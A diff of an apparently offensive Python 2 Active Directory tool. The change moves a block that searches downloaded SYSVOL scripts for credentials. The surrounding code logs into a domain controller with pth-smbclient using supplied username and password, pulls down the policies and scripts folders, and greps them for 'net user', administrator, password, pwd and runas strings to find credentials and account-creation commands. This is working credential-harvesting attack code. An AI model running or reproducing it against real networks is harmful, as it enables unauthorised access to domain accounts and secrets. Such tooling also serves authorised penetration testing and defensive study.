@@ -2256,33 +2256,7 @@ if policiesscripts_dump in yesanswers:
 				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget policies; exit' 2>/dev/null")
 				print colored("[+]Attempting to download scripts folder from /sysvol",'green')	
 				os.system("/usr/bin/pth-smbclient //"+targets[0]+"/SYSVOL -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+targets[0]+"; cd "+domain_name+"; recurse; prompt off; mget scripts; exit' 2>/dev/null")
-				if os.path.isdir(outputpath+targets[0]+'/scripts/'):
-					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/scripts/','green')	
-					os.chdir(outputpath+targets[0]+'/scripts/')
-					os.system("pwd")
-					#os.system("grep --color='auto' -ri net user")
-					os.system("grep --exclude=netuser.txt -ri \"net user\" > netuser.txt")
-					os.system("grep --color='auto' -ri administrator")
-					os.system("grep --color='auto' -ri password")
-					os.system("grep --color='auto' -ri pwd")
-					os.system("grep --color='auto' -ri runas")
-
-					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt'):
-							#If file is available parse it
-						print colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green')
-						print colored("[+]Items containing net user have been output to "+outputpath+targets[0]+'/scripts/netuser.txt','blue')
-						print colored("[+]Looking for Account creation in scripts.",'yellow')
-						try:
-							u = open(outputpath+targets[0]+'/scripts/netuser.txt').read().splitlines()
-						
-							for n in u:
-								#Check the line for net user /add which indicates an account being created
-								if n.find("net user"):									
-									if n.find("/add"):
-										print colored(n,'red')
-						except:
-							print "Failed"
-				
+								
 				if os.path.isdir(outputpath+targets[0]+'/Policies/'):
 					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/Policies/','green')	
 					os.chdir(outputpath+targets[0]+'/Policies/')
@@ -2323,6 +2297,33 @@ if policiesscripts_dump in yesanswers:
 
 						except IOError as e:
 							print "I/O error({0}): {1}".format(e.errno, e.strerror) 
+							
+				if os.path.isdir(outputpath+targets[0]+'/scripts/'):
+					print colored("[+]Attempting to to find references to administrator and password in "+outputpath+targets[0]+'/scripts/','green')	
+					os.chdir(outputpath+targets[0]+'/scripts/')
+					os.system("pwd")
+					#os.system("grep --color='auto' -ri net user")
+					os.system("grep --exclude=netuser.txt -ri \"net user\" > netuser.txt")
+					os.system("grep --color='auto' -ri administrator")
+					os.system("grep --color='auto' -ri password")
+					os.system("grep --color='auto' -ri pwd")
+					os.system("grep --color='auto' -ri runas")
+
+					if os.path.isfile(outputpath+targets[0]+'/scripts/netuser.txt'):
+							#If file is available parse it
+						print colored("[+]Excellent we have found \'net user\' in scripts... "+outputpath+targets[0]+'/scripts/','green')
+						print colored("[+]Items containing net user have been output to "+outputpath+targets[0]+'/scripts/netuser.txt','blue')
+						print colored("[+]Looking for Account creation in scripts.",'yellow')
+						try:
+							u = open(outputpath+targets[0]+'/scripts/netuser.txt').read().splitlines()
+						
+							for n in u:
+								#Check the line for net user /add which indicates an account being created
+								if n.find("net user"):									
+									if n.find("/add"):
+										print colored(n,'red')
+						except:
+							print "Failed"
 
 				sys.exit()
 		else:
